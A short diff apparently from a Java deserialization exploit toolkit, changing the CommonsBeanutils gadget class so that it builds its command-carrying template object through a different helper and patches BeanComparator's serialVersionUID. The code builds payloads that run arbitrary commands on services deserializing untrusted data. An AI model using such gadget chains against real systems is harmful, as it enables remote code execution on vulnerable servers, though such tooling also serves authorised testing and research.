@@ -24,7 +24,7 @@ public class CommonsBeanutils2183NOCC implements CommandObjectPayload<Object>
 
 	@Override
 	public Object getObject(String command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
+		final Object templates = Gadgets.createTemplates4Cmd(command);
 		// 修改BeanComparator类的serialVersionUID
 		POOL.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
 		final CtClass ctBeanComparator = POOL.get("org.apache.commons.beanutils.BeanComparator");
